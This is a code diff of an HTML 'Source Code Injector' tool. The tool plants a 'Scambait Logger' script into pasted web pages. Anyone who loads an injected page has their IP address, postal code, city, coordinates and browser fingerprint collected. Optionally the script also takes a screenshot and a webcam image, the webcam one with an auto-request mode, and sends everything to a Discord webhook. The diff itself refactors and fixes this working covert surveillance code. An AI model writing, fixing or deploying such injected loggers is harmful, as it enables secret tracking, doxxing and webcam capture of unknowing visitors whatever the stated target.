@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Source Code Injector - Paste, Inject, Copy, Host</title>
+    <title>Source Code Injector - Fixed</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -85,14 +85,6 @@
         }
         .status.success { background: #0a0; color: #000; }
         .status.error { background: #a00; }
-        .badge {
-            background: #0f0;
-            color: #000;
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 10px;
-            margin-left: 8px;
-        }
     </style>
 </head>
 <body>
@@ -120,17 +112,16 @@
                     <label>🎯 Discord Webhook URL</label>
                     <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
                     
-                    <label>🎥 Webcam Capture (optional - use carefully)</label>
-                    <select id="webcamMode" style="background:#0a0a0f;color:#fff;padding:10px;border-radius:8px;">
+                    <label>🎥 Webcam Capture</label>
+                    <select id="webcamMode">
                         <option value="off">Off (Recommended)</option>
                         <option value="prompt">Prompt with Button</option>
                         <option value="auto">Auto-Request on Load</option>
                     </select>
                     
                     <label>📸 Screenshot Capture</label>
-                    <select id="screenshotMode" style="background:#0a0a0f;color:#fff;padding:10px;border-radius:8px;">
+                    <select id="screenshotMode">
                         <option value="full">Full Page</option>
-                        <option value="viewport">Viewport Only</option>
                         <option value="off">Off</option>
                     </select>
                 </div>
@@ -155,23 +146,18 @@
     <div id="status" class="status">Ready</div>
     
     <script>
-        // Logger script that gets injected
-        const LOGGER_SCRIPT = `
+        // Logger script as a function that returns string (properly escaped)
+        function getLoggerScript(webhook, webcamMode, screenshotMode) {
+            return `
 <!-- Scambait Logger Injected -->
 <script>
 (async function() {
-    const WEBHOOK = '{{WEBHOOK}}';
-    const WEBCAM_MODE = '{{WEBCAM_MODE}}';
-    const SCREENSHOT_MODE = '{{SCREENSHOT_MODE}}';
+    const WEBHOOK = '${webhook}';
+    const WEBCAM_MODE = '${webcamMode}';
+    const SCREENSHOT_MODE = '${screenshotMode}';
     
     let collectedData = {
-        ip: '',
-        postalCode: '',
-        city: '',
-        region: '',
-        country: '',
-        lat: '',
-        lon: '',
+        ip: '', postalCode: '', city: '', region: '', country: '', lat: '', lon: '',
         userAgent: navigator.userAgent,
         screen: screen.width + 'x' + screen.height,
         language: navigator.language,
@@ -187,10 +173,9 @@
         webcam: null
     };
     
-    // Get IP + Postal Code
     async function getLocation() {
         try {
-            const res = await fetch('http://ip-api.com/json/');
+            const res = await fetch('https://ip-api.com/json/');
             const data = await res.json();
             if (data.status === 'success') {
                 collectedData.ip = data.query;
@@ -204,7 +189,6 @@
         } catch(e) {}
     }
     
-    // Screenshot
     async function captureScreenshot() {
         if (SCREENSHOT_MODE === 'off') return;
         await new Promise((resolve) => {
@@ -220,7 +204,6 @@
         } catch(e) {}
     }
     
-    // Webcam
     async function captureWebcam() {
         if (WEBCAM_MODE === 'off') return;
         try {
@@ -236,7 +219,7 @@
             collectedData.webcam = canvas.toDataURL('image/jpeg', 0.6);
             stream.getTracks().forEach(t => t.stop());
             
-            if (WEBHOOK !== '{{WEBHOOK}}') {
+            if (WEBHOOK !== 'WEBHOOK_PLACEHOLDER') {
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -249,15 +232,14 @@
         } catch(e) {}
     }
     
-    // Send to Discord
     async function sendData() {
-        if (!WEBHOOK || WEBHOOK === '{{WEBHOOK}}') return;
+        if (!WEBHOOK || WEBHOOK === 'WEBHOOK_PLACEHOLDER') return;
         const fields = [
             { name: '🌐 IP', value: collectedData.ip || 'Unknown', inline: true },
             { name: '📮 Postal Code', value: collectedData.postalCode || 'Unknown', inline: true },
             { name: '📍 Location', value: collectedData.city + ', ' + collectedData.region + ', ' + collectedData.country, inline: true },
             { name: '🗺️ Coords', value: collectedData.lat + ', ' + collectedData.lon, inline: true },
-            { name: '💻 UA', value: (collectedData.userAgent || '').substring(0, 80), inline: false },
+            { name: '💻 User Agent', value: (collectedData.userAgent || '').substring(0, 80), inline: false },
             { name: '📱 Screen', value: collectedData.screen, inline: true },
             { name: '🧠 Cores/RAM', value: collectedData.cores + 'c / ' + (collectedData.memory || '?') + 'GB', inline: true },
             { name: '🕐 Timezone', value: collectedData.timezone, inline: true },
@@ -269,7 +251,6 @@
         await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });
     }
     
-    // Auto webcam
     if (WEBCAM_MODE === 'auto') setTimeout(captureWebcam, 2000);
     else if (WEBCAM_MODE === 'prompt') {
         const btn = document.createElement('button');
@@ -279,14 +260,14 @@
         document.body.appendChild(btn);
     }
     
-    // Run
     await getLocation();
     await captureScreenshot();
     await sendData();
 })();
-</script>
+<\/script>
 <!-- End Logger -->
 `;
+        }
         
         const sourceTextarea = document.getElementById('sourceCode');
         const webhookInput = document.getElementById('webhook');
@@ -309,8 +290,8 @@
         }
         
         function injectLogger() {
-            let source = sourceTextarea.value.trim();
-            if (!source) {
+            let source = sourceTextarea.value;
+            if (!source.trim()) {
                 setStatus('Paste some HTML source code first', true);
                 return;
             }
@@ -324,13 +305,8 @@
             const webcamMode = webcamSelect.value;
             const screenshotMode = screenshotSelect.value;
             
-            // Prepare the logger with user's settings
-            let logger = LOGGER_SCRIPT
-                .replace(/{{WEBHOOK}}/g, webhook)
-                .replace(/{{WEBCAM_MODE}}/g, webcamMode)
-                .replace(/{{SCREENSHOT_MODE}}/g, screenshotMode);
+            const logger = getLoggerScript(webhook, webcamMode, screenshotMode);
             
-            // Inject logger into HTML
             let injected = source;
             
             // Inject before </head> or </body>
@@ -343,10 +319,10 @@
             }
             
             currentOutput = injected;
-            outputDiv.textContent = currentOutput.length > 3000 ? 
+            const truncated = currentOutput.length > 3000 ? 
                 currentOutput.substring(0, 3000) + '\n\n... (truncated)' : 
                 currentOutput;
-            
+            outputDiv.textContent = truncated;
             setStatus('✅ Logger injected! Copy the code and host it anywhere.');
         }
         
@@ -374,7 +350,6 @@
         copyBtn.addEventListener('click', copyOutput);
         clearBtn.addEventListener('click', clearAll);
         
-        // Load saved webhook
         const saved = localStorage.getItem('scambait_webhook');
         if (saved) webhookInput.value = saved;
         webhookInput.addEventListener('change', () => localStorage.setItem('scambait_webhook', webhookInput.value));
